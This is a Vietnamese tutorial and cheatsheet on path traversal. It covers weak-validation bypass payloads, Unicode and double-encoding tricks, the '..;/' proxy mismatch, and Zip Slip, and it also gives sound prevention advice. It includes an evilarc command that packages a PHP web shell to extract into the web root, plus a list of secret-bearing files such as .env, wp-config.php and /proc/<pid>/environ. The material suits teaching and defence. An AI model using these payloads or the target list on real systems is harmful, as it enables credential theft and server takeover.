# Path Traversal

## Mục lục

- [Techniques](#techniques)
  - [Kiểm tra, validate yếu](#kiểm-tra-validate-yếu)
  - [Zip Slip](#zip-slip)
  - [Multi-layer transform mismatch](#multi-layer-transform-mismatch)
  - [Unicode normalization](#unicode-normalization)
- [Cách phòng chống](#cách-phòng-chống)
- [Common file path cheatsheet](#common-file-path-cheatsheet)
  - [Common app path](#common-file-path-cheatsheet)
  - [Linux path](#linux-path)
  - [Window path](#window-path)
  
Là lỗ hổng xảy ra do dữ liệu không tin cậy từ người dùng rơi vào những hàm xử lí đường dẫn tệp tin. Attacker có thể thao túng file path và gây ra các hậu quả như đọc ghi file bất kì, ghi xóa file hay thậm chí là RCE tùy thuộc vào logic của chương trình.

---

## Techniques

Về cơ bản, ta sẽ tận dụng `..` để kiểm soát đường dẫn. Hoặc `absolute path` trong một số trường hợp. Còn lại, tùy vào logic của app ta sẽ có cách xử lí khai thác riêng.

---

### Kiểm tra, validate yếu

#### 1. Chặn `..`

```python
if '..' in path:
    reject()
# sử dụng absolute path
```

#### 2. Check prefix yếu

```python
base = '/uploads'
if ! file_path.startswith(base):
    reject()
# file_path = '/uploads/../etc/passwd'
```

Hoặc:

```python
base = '/uploads'
file_path = realpath(base + '/' path)
if ! file_path.startswith(base):
    reject()
# Cách này an toàn hơn cách trên do đã canonicalize đường dẫn sau đó mới check startswith nhưng vẫn gây rủi ro
# Trong trường hợp path = '../uploads_xyz/\<xyz\>'
# Lúc này nó đã mở sang một thư mục khác là uploads_xyz chứ không còn là uploads
```

#### 3. Strip replace

```python
p = re.sub(r'\.\./', '', path)
# path = '..././..././..././abc'
```

#### 4. Sai thứ tự decode/normalize/canonicalize

```python
if '..' in path:
    resolve()
path = urllib.parse.unquote(path)
open(path)
# path = '%252e%252e%252fetc%252fpasswd'
```

#### 5. Normalize sai tầng

```python
base = '/uploads'
path = os.path.normpath(path)
file_path = os.path.join(base, path)
# Trong trường hợp này ta có 2 cách
# 1. path = \<absolute path\> do os.path.join sẽ trả về path nếu nếu path là absolute mà không quan tâm đến base
# 2. path = '../etc/passwd' do normpath chỉ làm sạch chứ không canonicalize
```

---

### Zip Slip

Nguyên nhân gốc rễ là do ứng dụng giải nén file (zip/tar) nhưng không kiểm tra đường dẫn bên trong archive.

```python
import zipfile
import os

def unzip_vulnerable(zip_path, extract_dir):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for file in zip_ref.namelist():
            file_path = os.path.join(extract_dir, file)  # không validate path
            print(f"[+] Extracting: {file_path}")
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "wb") as f:
                f.write(zip_ref.read(file))
```

Trong đoạn code mô phỏng trên, ứng dụng extract zip file sau đó join trực tiếp file name không qua validate và sau đó tạo thư mục rồi ghi file. Nếu attack có thể upload file zip thì có thể dẫn đến ghi file tùy ý.

Để tạo file tar/zip archive có chứa path traversal ta có thể sử dụng `evilarc`:  
`https://github.com/ptoomey3/evilarc/blob/master/README.md`

```bash
python3 evilarc.py <file muốn zip> -o <unix|win> -f <tên file sau zip> -p <dir muốn thêm sau traversal> -d <số traversal>
```

Ví dụ:

```bash
python3 evilarc.py shell.php -o unix -f shell.zip -p var/www/html/ -d 3
```

Sẽ zip `shell.php` thành `shell.zip` chứa `../../../var/www/html/shell.php`

---

### Multi-layer transform mismatch

Trong thực tế, input thường không đi thẳng vào app mà thường đi qua nhiều lớp: `CDN/WAF -> reverse proxy -> web server -> middleware -> application code`

Chính vì đi qua nhiều lớp, nên nếu như có sự mismatch giữa các lớp có thể tạo nên khe hở để bypass.

Ví dụ:

`User Input → (Layer 1: Decode) → (Layer 2: Validate) → (Layer 3: Decode again) → File Access`

Trong trường hợp này khi ta encode 2 lần thì ta sẽ vượt qua được lớp validate ở lớp 2.

Một ví dụ khác:

`User Input -> WAF (rule chặn path traversal) -> Application code (Normalize) -> File Access`

Với ví dụ này, ta có thể dựa vào logic mà ứng dụng normalize để biến đổi input và bypass rule WAF.  
Chẳng hạn, WAF dùng rule chặn `../../` liên tiếp:

Ta sẽ chèn `....//` qua WAF và tới application nó sẽ normalize lại thành `../` sau đó mới tới File Access.

Hay trong một ví dụ khác (CVE-2021-45967):

`User → Nginx (reverse proxy) → Tomcat → File/Servlet access`

Nginx và Tomcat parse URL khác nhau.

- Nginx: coi `/..;/` → như 1 directory hợp lệ
- Tomcat: `/..;/` → strip `;` → `/../`

Kết hợp sự mismatch tạo thành bypass dẫn đến path traversal:

```text
/services/pluginscript/..;/..;/..;/getFavicon?host=attacker.com
```

---

### Unicode normalization

Một kí tự có thể có nhiều cách biểu diễn khác nhau ở mỗi dạng. Chính vì thế, một số ứng dụng sẽ chuẩn hóa Unicode text để dữ liệu được đồng nhất. Tuy nhiên, nếu không xử lí chuẩn chỉnh điều này có thể làm kẻ hở để bypass WAF.

2 dạng chuẩn thường được normalize về:

- `NFC`: hiển thị, lưu trữ (các ký tự giống nhau → cùng 1 representation chuẩn)
- `NFKC`: security, validation (biến các ký tự “lookalike” → ASCII chuẩn)

Khi xử lí normalize về `NFKC` có thể gây ra việc tạo các kí tự path traversal từ các kí tự không chuẩn ASCII:

| Character | Payload | NFKC |
|-----------|---------|------|
| ‥ (U+2025) | `‥/‥/‥/etc/passwd` | `../../../etc/passwd` |
| ︰ (U+FE30) | `︰/︰/︰/etc/passwd` | `../../../etc/passwd` |

Ngoài ra vẫn còn nhiều dạng Unicode đặc biệt khác.

---

## Cách phòng chống

- Không cho user kiểm soát path trực tiếp nếu không thật sự cần.
- Dùng allowlist / ID mapping thay vì nhận path raw từ input.

- Thứ tự xử lí an toàn:
  - decode
  - normalize
  - canonicalize / resolve
  - validate trên giá trị cuối cùng
  - file access

- Không tin vào:
  - blacklist `..`
  - strip / replace
  - `startswith()`
  - check prefix kiểu string

- Với zip/tar:
  - validate từng entry
  - reject path traversal
  - chỉ extract vào thư mục kiểm soát được

- Mẫu kiểm tra an toàn:

```python
base = os.path.realpath(BASE)
candidate = os.path.realpath(os.path.join(base, user_input))

if os.path.commonpath([base, candidate]) != base:
    reject()
```
---

## Common file path cheatsheet

### PHP (thuần)

#### Document root
- `/var/www/html/index.php`
- `/var/www/<project>/index.php`
- `/var/www/<project>/public/index.php`

#### Log file
- `/var/log/apache2/access.log`
- `/var/log/apache2/error.log`
- `/var/log/nginx/access.log`
- `/var/log/nginx/error.log`
- `/var/log/php-fpm.log`

#### Env file
- `/var/www/<project>/.env`
- `/etc/environment`
- `/etc/default/<service>`

#### Config file
- `/etc/nginx/nginx.conf`
- `/etc/nginx/sites-available/<site>.conf`
- `/etc/apache2/apache2.conf`
- `/etc/apache2/sites-available/<site>.conf`
- `/etc/php/<version>/fpm/php.ini`

---

### Laravel

#### Document root / entry file
- `/var/www/<project>/public/index.php`

#### Log file
- `/var/www/<project>/storage/logs/laravel.log`

#### Env file
- `/var/www/<project>/.env`

#### Config file
- `/var/www/<project>/config/app.php`
- `/var/www/<project>/config/database.php`
- `/var/www/<project>/config/queue.php`

---

### Symfony

#### Document root
- `/var/www/<project>/public/index.php`

#### Log file
- `/var/www/<project>/var/log/dev.log`
- `/var/www/<project>/var/log/prod.log`

#### Env file
- `/var/www/<project>/.env`
- `/var/www/<project>/.env.local`

#### Config file
- `/var/www/<project>/config/services.yaml`
- `/var/www/<project>/config/routes.yaml`

---

### WordPress

#### Document root
- `/var/www/html/index.php`
- `/var/www/html/wp-blog-header.php`

#### Log file
- `/var/www/html/wp-content/debug.log`
- `/var/log/nginx/error.log`
- `/var/log/apache2/error.log`

#### Env file
- `/var/www/html/wp-config.php`

#### Config file
- `/var/www/html/wp-config.php`
- `/var/www/html/.htaccess`

---

### Flask

#### Entry file
- `/app/app.py`
- `/app/wsgi.py`

#### Log file
- `/app/logs/app.log`
- `/var/log/gunicorn/error.log`

#### Env file
- `/app/.env`
- `/app/.flaskenv`

#### Config file
- `/app/config.py`
- `/app/instance/config.py`

---

### Django

#### Entry file
- `/app/manage.py`
- `/app/<project>/wsgi.py`
- `/app/<project>/asgi.py`

#### Log file
- `/app/logs/django.log`
- `/var/log/gunicorn/error.log`

#### Env file
- `/app/.env`

#### Config file
- `/app/<project>/settings.py`
- `/app/<project>/urls.py`

---

### Node.js (thuần)

#### Entry file
- `/app/app.js`
- `/app/server.js`
- `/app/index.js`

#### Log file
- `/app/logs/app.log`

#### Env file
- `/app/.env`
- `/app/.env.production`

#### Config file
- `/app/package.json`
- `/app/ecosystem.config.js`

---

### Express

#### Entry file
- `/app/app.js`
- `/app/server.js`

#### Log file
- `/app/logs/app.log`

#### Env file
- `/app/.env`

#### Config file
- `/app/package.json`
- `/app/ecosystem.config.js`

---

### Linux path

#### System information

- `/proc/meminfo`  
  **Chứa:** thông tin RAM, swap, memory usage  
  **Dùng khi:** cần kiểm tra tài nguyên bộ nhớ của máy

- `/proc/cpuinfo`  
  **Chứa:** thông tin CPU, core, model  
  **Dùng khi:** cần xác định cấu hình CPU hoặc môi trường chạy

- `/proc/uptime`  
  **Chứa:** thời gian máy đã chạy  
  **Dùng khi:** cần biết host vừa reboot hay đã chạy lâu

- `/proc/net/arp`  
  **Chứa:** bảng ARP cơ bản  
  **Dùng khi:** cần xem mapping IP/MAC trong mạng nội bộ

---

#### Process information

- `/proc/<pid>/cmdline`  
  **Chứa:** command line arguments của process  
  **Dùng khi:** cần biết process được chạy bằng lệnh nào, tham số gì

- `/proc/<pid>/cwd`  
  **Chứa gì:** current working directory của process  
  **Dùng khi:** cần xác định thư mục app đang chạy từ đâu

- `/proc/<pid>/environ`  
  **Chứa:** environment variables của process  
  **Dùng khi:** cần tìm biến môi trường như cấu hình app, DB host, API endpoint  
  **Lưu ý:** rất nhạy cảm, có thể chứa secret / credentials

- `/proc/<pid>/fd/`  
  **Chứa:** các file descriptor đang mở  
  **Dùng khi:** cần xem process đang mở file, socket, log, config nào

---

#### Shell history

- `~/.bash_history`  
  **Chứa gì:** lịch sử lệnh shell đã chạy  
  **Dùng khi:** cần xem thao tác vận hành gần đây, câu lệnh admin từng dùng  
  **Lưu ý:** có thể vô tình lộ token, password, path nhạy cảm nếu từng gõ trực tiếp

---

### Window path

```text
...
Update later
...
```

## References

- `https://medium.com/@jeroenverhaeghe/advanced-directory-traversal-attacks-against-linux-6a9a7ab27766`